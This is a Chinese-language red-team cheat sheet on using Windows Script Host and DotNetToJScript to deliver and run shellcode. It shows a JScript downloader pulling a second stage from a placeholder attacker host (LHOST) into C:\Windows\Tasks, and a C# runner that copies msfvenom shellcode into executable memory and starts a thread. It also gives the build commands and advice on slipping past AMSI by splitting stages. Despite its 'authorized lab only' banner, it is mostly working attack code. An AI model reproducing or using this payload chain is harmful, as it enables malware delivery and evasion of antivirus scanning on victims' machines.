# WSH 与 .NET

::: warning 仅供学习 / 授权实验
JScript / DotNetToJScript 用于授权 lab。生成物自己编译，不要把默认工程名当指纹。
:::

`cscript` / `wscript` 能跑、EXE 不能，是常见组合。WSH **不是** .NET 进程。

## 宿主位数

```bat
echo %PROCESSOR_ARCHITECTURE%
cscript //nologo runner.js
:: 64 位系统双击 = System32 的 64 位 wscript
:: 32 位程序集必须用 SysWOW64\cscript.exe
```

64 位宿主只能加载 x64 / AnyCPU。注入 `explorer.exe` 时 shellcode 位数跟**目标进程**走。

## 最小下载器（只落盘，不直接 Run exe）

```javascript
var url  = "http://LHOST/stage.js";
var dest = "C:\\Windows\\Tasks\\stage.js";
var http = new ActiveXObject("MSXML2.XMLHTTP");
http.open("GET", url, false);
http.send();
var f = new ActiveXObject("Scripting.FileSystemObject").CreateTextFile(dest, true);
f.Write(http.responseText);
f.Close();
// 需要执行时再：
// new ActiveXObject("WScript.Shell").Run("cscript //nologo " + dest, 0, false);
```

## DotNetToJScript 流程

公开工具：[tyranid/DotNetToJScript](https://github.com/tyranid/DotNetToJScript)

```bat
:: 1) C# 程序集：ComVisible 类，构造函数里跑 shellcode
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /platform:anycpu /out:payload.dll payload.cs

:: 2) 序列化进 JScript（v4 对应 .NET 4.x）
DotNetToJScript.exe payload.dll --lang=Jscript --ver=v4 -o runner.js

:: 3) 目标
cscript //nologo runner.js
```

C# 骨架：

```csharp
using System;
using System.Runtime.InteropServices;

[ComVisible(true)]
public class TestClass {
    [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint st, IntPtr s, IntPtr p, uint f, IntPtr id);

    public TestClass() {
        byte[] sc = new byte[] { /* msfvenom -f csharp 贴这里 */ };
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
        Marshal.Copy(sc, 0, mem, sc.Length);
        CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
    }
}
```

无 Windows 工具机时可用 SuperSharpShooter 吃 raw shellcode 出 `.js`（自行从作者仓库取）。

`--ver=v2` 需要目标启用 .NET 3.5；现代机默认 **v4**。

## AMSI（WSH）

Win10+ 会扫送进引擎的**文本**。纯下载逻辑有时能过；`eval` 拼出来的大段第二阶段容易被拦。  
PowerShell 的 AMSI 处理**不能**直接贴进 `.js`。

## 失败

| 现象 | 查 |
|---|---|
| 双击无回连 | 位数、.NET 版本 |
| 简单 js 能跑，桥接被拦 | 内容扫描；拆阶段 |
| 脚本再 `Run(pay.exe)` 失败 | 这正是走 WSH 的原因，别回到 EXE |
